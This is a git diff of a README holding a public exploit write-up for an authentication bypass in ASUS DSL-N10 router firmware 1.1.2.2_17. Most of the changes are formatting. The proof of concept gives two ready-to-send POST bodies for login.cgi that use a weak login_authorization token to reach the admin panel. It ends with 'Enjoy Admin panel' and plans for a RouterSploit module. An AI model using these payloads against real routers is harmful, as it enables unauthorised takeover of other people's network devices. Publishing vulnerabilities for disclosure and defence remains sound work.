@@ -1,10 +1,10 @@
 # ASUS-DSL-N10---Authentication-Bypass
 
 ## Title: ASUS-DSL N10 1.1.2.2_17 - Authentication Bypass
-Author: AmnBAN team
-Date: 2018-08-06
-Vendor Homepage: https://www.asus.com/Networking/DSLN10_C1_with_5dBi_antenna/
-Sofrware version: 1.1.2.2_17
+Author: AmnBAN team  
+Date: 2018-08-06  
+Vendor Homepage: https://www.asus.com/Networking/DSLN10_C1_with_5dBi_antenna/  
+Sofrware version: 1.1.2.2_17  
 CVE: N/A
  
 ## 1. Description:
@@ -14,7 +14,7 @@ the data of this parameter is not fully random and you can use old data
 or data of another device to access admin panel.
  
 ## 2. Proof of Concept:
-Browse http://<Your Modem IP>/login.cgi
+Browse http://< Your Modem IP >/login.cgi
  
 Send this post data:
 group_id=&action_mode=&action_script=&action_wait=5&current_page=Main_Login.asp&next_page=%2Fcgi-bin%2FAdvanced_LAN_Content.asp&login_authorization=YWRtaW46MQ%3D%2D
@@ -22,10 +22,10 @@ group_id=&action_mode=&action_script=&action_wait=5&current_page=Main_Login.asp&
 Or this post data:
 group_id=&action_mode=&action_script=&action_wait=5&current_page=Main_Login.asp&next_page=%2Fcgi-bin%2FAdvanced_LAN_Content.asp&login_authorization=FWRtaW46MQ%3D5D
 
-## 3. Enjoy Admin panel
+Enjoy Admin panel
 
-## links
+## links:
 https://www.exploit-db.com/exploits/45201/
 
 ## TODO:
-Develop RouterSploit  module for this vulnerability
+Develop [RouterSploit](https://github.com/threat9/routersploit)  module for this vulnerability
